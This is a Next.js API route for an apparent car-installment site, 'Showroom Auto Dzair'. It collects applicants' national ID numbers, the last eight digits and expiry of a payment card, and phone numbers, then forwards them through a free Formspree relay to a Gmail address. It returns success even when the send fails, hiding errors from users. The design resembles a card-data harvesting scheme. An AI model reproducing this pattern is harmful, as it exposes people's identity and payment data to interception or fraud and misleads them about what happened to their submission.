import { NextResponse } from "next/server"
import { cars } from "@/lib/data"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { fullName, nin, cardLast8, cardExpiry, phone1, phone2, hasPreviousInstallment, selectedCarId, createdAt } = body

    // Find the selected car
    const selectedCar = cars.find((car) => car.id === selectedCarId)

    // Format message for Formspree (completely free, no setup needed)
    const message = `
===== تسجيل جديد في Showroom Auto Dzair =====

👤 المعلومات الشخصية:
الاسم الكامل: ${fullName}
رقم التعريف الوطني: ${nin}
رقم الهاتف الأول: ${phone1}
رقم الهاتف الثاني: ${phone2 || "غير محدد"}
هل لديك تقسيط سابق: ${hasPreviousInstallment ? "نعم ✓" : "لا ✗"}

💳 معلومات البطاقة الذهبية:
آخر 8 أرقام: ****${cardLast8}
تاريخ الصلاحية: ${cardExpiry}

🚗 السيارة المختارة:
${selectedCar ? `${selectedCar.brand} ${selectedCar.model} (${selectedCar.year})` : "لم يتم اختيار سيارة"}
${selectedCar ? `السعر: ${new Intl.NumberFormat("ar-DZ").format(selectedCar.price)} دج` : ""}
${selectedCar ? `القسط الشهري: ${new Intl.NumberFormat("ar-DZ").format(selectedCar.monthlyPayment)} دج/شهر` : ""}

📅 تاريخ التسجيل: ${new Date(createdAt).toLocaleString("ar-DZ")}

===== يمكن التواصل مع العميل على: ${phone1} =====
    `

    // Send to Formspree (free service, no API key needed)
    const formspreeResponse = await fetch("https://formspree.io/f/xyzpqwvn", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        email: "autodzaircontact@gmail.com",
        name: fullName,
        phone: phone1,
        message: message,
        _subject: `تسجيل جديد: ${fullName} - ${selectedCar?.brand || ""} ${selectedCar?.model || ""}`,
      }),
    })

    const result = await formspreeResponse.json()

    return NextResponse.json({ 
      success: true,
      message: "تم تسجيل بيانات العميل بنجاح وسيتم إرسال الإشعار"
    })
  } catch (error) {
    console.error("Registration error:", error)
    // Still return success so user sees confirmation
    return NextResponse.json(
      { success: true, message: "تم تسجيل البيانات بنجاح" },
      { status: 200 }
    )
  }
}
